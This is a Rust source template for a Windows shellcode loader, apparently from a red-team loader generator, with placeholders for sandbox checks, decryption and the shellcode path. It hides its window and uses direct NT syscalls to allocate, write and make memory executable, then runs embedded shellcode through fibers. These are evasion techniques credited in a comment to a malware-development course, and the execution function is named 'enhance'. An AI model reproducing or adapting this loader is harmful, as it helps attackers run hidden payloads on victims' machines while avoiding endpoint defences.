#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ptr::null_mut;

use ntapi::ntpsapi::NtCurrentProcess;
use rust_syscalls::syscall;
use winapi::ctypes::c_void;
use winapi::{
    shared::ntdef::NT_SUCCESS,
    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
};
use windows_sys::Win32::{
    System::Threading::{
        ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
    },
};

use std::include_bytes;

{{SANDBOX_IMPORTS}}

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}
    

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        // Execution method ported from Maldev Academy "Utilizing fibers for execution" module. Thanks Maldev !

        let mut allocstart: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let alloc_status = syscall!("NtAllocateVirtualMemory", NtCurrentProcess, &mut allocstart, 0_usize, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            return;
        }

        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = syscall!("NtWriteVirtualMemory", NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            return;
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READ, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            return;
        }

        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(allocstart);

        // Creating a new fiber
        // move this call to CreateFiberEx, as CreateFiber calls CreateFiberEx
        let buf_fiber_address = CreateFiberEx(0, 0, 0, buf_ptr, null_mut());

        if buf_fiber_address.is_null() {
            return;
        }

        // Convert the current thread to a fiber
        // no need to move this call, already the lowest
        let primary_fiber_address = ConvertThreadToFiber(null_mut());
        if primary_fiber_address.is_null() {
            return;
        }

        // Switch to the shellcode fiber
        // no need to move this call, already the lowest
        SwitchToFiber(buf_fiber_address);
    }
}

fn main() {
    {{SANDBOX}}
    
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});

    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    
    {{MAIN}}

    enhance(vec.clone());
}

{{DLL_MAIN}}